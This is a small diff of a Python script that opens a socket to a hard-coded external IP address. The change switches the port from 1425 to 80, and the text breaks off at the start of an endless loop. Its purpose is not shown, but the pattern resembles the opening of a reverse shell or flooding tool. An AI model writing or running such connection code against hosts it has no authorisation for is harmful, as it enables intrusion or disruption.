@@ -4,7 +4,7 @@ import socket
 
 s = socket.socket()
 target = '52.169.181.92'
-port = 1425
+port = 80
 s.connect((target,port))
 
 while True:
